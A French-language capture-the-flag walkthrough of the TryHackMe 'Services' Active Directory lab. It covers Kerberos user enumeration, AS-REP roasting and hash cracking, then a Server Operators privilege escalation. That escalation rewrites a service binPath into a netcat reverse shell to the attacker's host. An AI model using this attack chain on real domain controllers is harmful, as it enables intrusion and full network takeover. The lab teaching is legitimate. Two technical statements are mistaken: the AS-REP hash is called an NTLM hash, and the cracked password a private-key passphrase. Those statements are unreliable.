@@ -1,0 +1,81 @@
+What's going on guys, c'est Anis et bienvenue dans cette nouvelle leçon dans laquelle on va voir un test d'intrusion sur un système d'exploitation Windows et plus particulièrement dans un environnement Active Directory (AD). 
+
+Nous avons vu précédemment comment auditer un système Linux. Pour travailler sur Windows et ses réseaux d'entreprise, il est tout aussi important d'avoir des notions fondamentales sur le fonctionnement du système d'exploitation Windows et sur l'architecture Active Directory. L'Active Directory est un service d'annuaire développé par Microsoft qui permet aux administrateurs de centraliser et de gérer l'authentification et les autorisations (droits d'accès) des utilisateurs et des ordinateurs au sein d'un réseau local.
+
+Pour ceux qui débutent complètement, je vous conseille deux excellentes ressources. La première est en anglais, sur Hack The Box Academy. Recherchez le module gratuit « Introduction to Active Directory ». Il détaille toutes les bases de la sécurité et de la configuration de ces réseaux. La seconde est en français, sur OpenClassrooms : « Centralisez et sécurisez votre annuaire Active Directory ». C'est un cours très bien structuré, avec des chapitres et des articles, qui vous apprendra à configurer un domaine Active Directory, à gérer les stratégies de groupe (les GPO), à sécuriser l'annuaire, etc. Ces cours vous donneront les bases requises pour suivre cette leçon. Je vous mets les liens dans les ressources.
+
+Pour notre pratique aujourd'hui, nous allons utiliser le challenge « Services » sur la plateforme TryHackMe. J'ai lancé la machine cible et j'ai son adresse IP. Nous avons deux heures pour mener à bien notre audit. L'objectif est de s'introduire sur le serveur et de récupérer deux flags (`user.txt` et `root.txt`).
+
+Comme d'habitude, nous commencent par un scan de ports avec Nmap. Pour gagner du temps, j'ai déjà lancé un scan complet agressif : `sudo nmap -A -Pn <IP_cible>`. En conditions réelles, évitez le paramètre `-A` car il est très bruyant et se fait facilement détecter par les IDS/IPS. L'option `-Pn` permet de désactiver le ping de découverte si le pare-feu bloque l'ICMP. 
+
+L'analyse des résultats Nmap nous révèle :
+- Le port 53 (DNS) avec le service Simple DNS Plus.
+- Le port 80 (HTTP) hébergeant un serveur web Microsoft IIS 10.0. La présence d'IIS confirme qu'il s'agit d'une machine Windows.
+- Le port 88 (Kerberos). Kerberos est le protocole d'authentification par défaut dans un domaine Active Directory.
+- Le port 389 (LDAP), un protocole central dans l'Active Directory pour interroger l'annuaire.
+
+La combinaison de ces services (DNS, Kerberos, LDAP) indique très clairement que cette machine est un contrôleur de domaine (Domain Controller ou DC). Le contrôleur de domaine est le serveur central et le « capitaine » d'un réseau Active Directory ; il gère les comptes et les politiques de sécurité. C'est la cible ultime d'un test d'intrusion car sa compromission signifie le contrôle total du réseau d'entreprise. 
+
+Nous repérons également le nom de domaine de la cible dans les informations LDAP : `services.local`. L'analyse SMB indique : `message signing enabled and required`, ce qui signifie que la signature des paquets SMB est requise (ce qui protège contre le relais SMB). 
+
+Pour compléter ce scan, j'aime utiliser RustScan, qui est un scanner de ports extrêmement rapide. Je lance `rustscan -a <IP_cible>`. RustScan découvre rapidement un port supplémentaire : le port 5985. C'est le port par défaut du service WinRM (Windows Remote Management), un protocole d'administration à distance très utile pour obtenir un shell sur une machine Windows. Si nous le souhaitions, nous pourrions faire un scan Nmap ciblé sur ce port (`nmap -p 5985 -sV <IP_cible>`), mais nous avons déjà les informations nécessaires.
+
+Pour commencer, nous allons ajouter l'adresse IP et le nom de domaine de la cible dans notre fichier `/etc/hosts` : `<IP_cible> services.local`. 
+
+Nous allons maintenant explorer le serveur web sur le port 80. Bien que l'audit du site web ne soit pas notre but principal, les serveurs web d'entreprise divulguent souvent des informations précieuses. En naviguant sur le site et en consultant la page de contact, on trouve un format d'e-mail : `g.doe@services.local`. Sur la page « About Us », nous voyons les noms des collaborateurs de l'entreprise (CEO, équipe IT, marketing, etc.), comme Joanne Doe ou J. Rock. Cela nous permet de déduire la convention de nommage des identifiants (la première lettre du prénom suivie du nom). 
+
+Nous allons créer un dictionnaire d'utilisateurs potentiels nommé `usernames.txt` en y listant des identifiants formatés :
+`j.rock@services.local`
+`g.doe@services.local`
+`w.masters@services.local`
+`j.larusso@services.local`
+`administrator@services.local`
+
+En conditions réelles, vous pouvez générer ce type de liste grâce à des techniques d'OSINT.
+
+Pour valider l'existence de ces utilisateurs sur le domaine, nous allons utiliser l'outil `kerbrute` avec l'option d'énumération des utilisateurs : `kerbrute userenum -d services.local usernames.txt --dc <IP_cible>`. Kerbrute interroge le service Kerberos et identifie les utilisateurs valides. Fait très intéressant, il retourne pour l'utilisateur `j.rock@services.local` le message : « NOT PRE-AUTH ». Cela signifie que ce compte ne requiert pas de pré-authentification Kerberos pour obtenir un ticket de la part du KDC (Key Distribution Center) du contrôleur de domaine.
+
+Expliquons ce concept. Dans un domaine Active Directory, pour qu'un utilisateur puisse accéder à un service, il doit obtenir un ticket d'authentification appelé TGT (Ticket Granting Ticket) auprès du KDC du contrôleur de domaine. Par défaut, le client envoie une requête d'authentification (`AS-REQ`) contenant un bloc de données chiffré avec son mot de passe (c'est la pré-authentification). Le KDC valide cette donnée avant de renvoyer le TGT dans la réponse `AS-REP`. Si la pré-authentification est désactivée pour un utilisateur, n'importe qui peut envoyer une requête `AS-REQ` pour cet utilisateur et le contrôleur de domaine renverra immédiatement un ticket `AS-REP`. Ce ticket contient une partie chiffrée avec le hash du mot de passe de l'utilisateur. Un attaquant peut intercepter cette réponse et tenter de casser le hash hors ligne pour retrouver le mot de passe en clair. C'est l'attaque classique appelée AS-REP Roasting.
+
+Puisque l'utilisateur `j.rock` n'exige pas de pré-authentification, nous allons mener cette attaque. Nous utilisons l'utilitaire `GetNPUsers.py` de la suite Impacket (que vous pouvez installer sur Kali avec `sudo apt install python3-impacket` ou via les scripts Impacket dédiés). Nous lançons la commande en indiquant le nom de domaine, la liste d'utilisateurs et l'adresse IP du contrôleur de domaine, en demandant d'exporter le hash obtenu au format John the Ripper dans un fichier `hash.txt`. 
+
+Nous affichons le fichier `hash.txt` avec `cat hash.txt` et nous voyons bien le hash NTLM de `j.rock`. Nous pouvons maintenant casser ce hash hors ligne avec John the Ripper en utilisant le dictionnaire `rockyou.txt` : `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. En quelques secondes, John the Ripper découvre la passphrase de la clé privée de `j.rock` (par exemple, « service_works »). Nous enregistrons précieusement ces identifiants.
+
+Nous allons maintenant poursuivre l'énumération du domaine. Nous disposons d'un compte utilisateur valide. Nous pouvons utiliser `CrackMapExec` (CME) pour auditer les partages SMB du contrôleur de domaine : `crackmapexec smb <IP_cible> -u j.rock -p 'service_works' --shares`. Les résultats nous montrent les différents partages réseau disponibles et nos droits d'accès. On note des partages par défaut comme `ADMIN$`, `C$`, `IPC$`, ainsi qu'un partage nommé `Anonymous`. Nous constatons que nous avons des droits d'accès en lecture sur certains partages. 
+
+Pour extraire automatiquement le contenu des partages réseau sur lesquels nous avons des droits de lecture, nous pouvons utiliser le module `spider_plus` de CrackMapExec : `crackmapexec smb <IP_cible> -u j.rock -p 'service_works' -M spider_plus -o READ_ONLY=True`. Ce module va lister l'arborescence des partages sous forme de fichiers JSON et télécharger les documents légers dans le dossier `/tmp/cme_spider_plus/`. 
+
+Si la connexion VPN est instable, veillez à la relancer, puis réexécutez la commande. 
+
+Pour extraire des informations détaillées de l'annuaire Active Directory (utilisateurs, groupes, machines, politiques de mots de passe, etc.), nous pouvons également utiliser l'utilitaire `ldapdomaindump`. Nous lançons la commande en spécifiant le domaine, l'adresse IP du contrôleur de domaine et les identifiants de `j.rock`. Le script génère plusieurs rapports aux formats JSON, HTML et XML. Nous pouvons ouvrir le fichier `domain_users.html` dans notre navigateur Firefox pour analyser la liste des utilisateurs du domaine.
+
+En analysant le rapport, nous constatons que l'utilisateur `j.rock` fait partie du groupe sensible « Server Operators » (Opérateurs de serveurs). Il fait également partie du groupe « Remote Management Users » (ce qui l'autorise à se connecter à distance via WinRM), tandis que les autres comptes de service par défaut (comme le compte `krbtgt` ou le compte invité `Guest`) ont des configurations classiques. 
+
+Faire partie du groupe « Server Operators » est une opportunité majeure pour l'escalade de privilèges. Les membres de ce groupe ont le droit de gérer et configurer les services Windows sur le contrôleur de domaine (démarrer, arrêter et modifier des services). Nous allons exploiter ce droit pour obtenir les privilèges d'administrateur local (SYSTEM).
+
+Pour nous connecter au serveur Windows à distance en ligne de commande, nous utilisons l'outil `evil-winrm` : `evil-winrm -i <IP_cible> -u j.rock -p 'service_works'`. La connexion s'établit et nous obtenons un shell PowerShell. 
+Nous recherchons le premier flag dans le dossier personnel de l'utilisateur. Nous nous rendons sur son bureau avec `cd C:\Users\j.rock\Desktop` et nous découvrons le fichier `user.txt` (notre premier flag).
+
+Maintenant, nous devons effectuer une escalade de privilèges. Nous commençons par analyser les privilèges de notre utilisateur actuel avec la commande `whoami /all`. La commande confirme notre identité et liste les groupes auxquels nous appartenons. Nous y retrouvons bien le groupe `Server Operators` et le groupe `Remote Management Users`. 
+
+En tant que membre de `Server Operators`, nous pouvons modifier la configuration d'un service système existant pour lui faire exécuter une commande malveillante sous le compte système le plus élevé (`NT AUTHORITY\SYSTEM`). Nous allons lister les services du serveur avec la commande `services` ou en listant les processus. Nous identifions des services comme `ADWS` (Active Directory Web Services) ou le service `Amazon SSM Agent` qui s'exécutent avec des privilèges SYSTEM. 
+
+Nous allons télécharger ou téléverser l'utilitaire Netcat (`nc.exe`) sur la machine victime pour ouvrir un reverse shell. Nous transférons le fichier depuis notre console Evil-WinRM en utilisant la commande `upload /path/to/nc.exe`. Une fois le fichier `nc.exe` sur le serveur Windows, nous allons modifier le chemin d'exécution du service ciblé (par exemple `ADWS`) en remplaçant la variable `binPath` par notre commande Netcat :
+`sc.exe config ADWS binpath= "C:\Users\j.rock\Documents\nc.exe -e cmd.exe <IP_Kali> 8888"`
+(Veillez à respecter les espaces après le signe `=` dans la commande `sc.exe`).
+La commande retourne `[SC] ChangeServiceConfig SUCCESS`.
+
+Nous configurons un écouteur Netcat sur notre machine Kali Linux sur le port 8888 : `nc -lvnp 8888`. 
+Ensuite, pour forcer le service à exécuter notre commande, nous l'arrêtons puis le démarrons :
+`sc.exe stop ADWS`
+`sc.exe start ADWS`
+
+Si le service `ADWS` rencontre des difficultés ou si la configuration est bloquée par l'OS, nous pouvons cibler un autre service comme le service Amazon SSM Agent en modifiant sa configuration de la même façon :
+`sc.exe config AmazonSSMAgent binpath= "C:\Users\j.rock\Documents\nc.exe -e cmd.exe <IP_Kali> 8888"`
+Puis nous relançons le service :
+`sc.exe stop AmazonSSMAgent`
+`sc.exe start AmazonSSMAgent`
+
+Notre écouteur interceptant la connexion inverse, nous obtenons un shell système. En tapant `whoami`, le système nous confirme que nous sommes connectés sous l'identité `NT AUTHORITY\SYSTEM`. Nous disposons désormais du contrôle total sur le contrôleur de domaine. Nous pouvons naviguer dans le dossier Bureau de l'administrateur (`C:\Users\Administrator\Desktop`) et lire le fichier `root.txt` contenant notre second flag.
+
+Ce challenge illustre parfaitement la méthodologie d'audit d'un environnement Active Directory : de l'énumération Kerberos à l'escalade de privilèges via des privilèges de groupe mal configurés. On se retrouve dans la prochaine leçon !
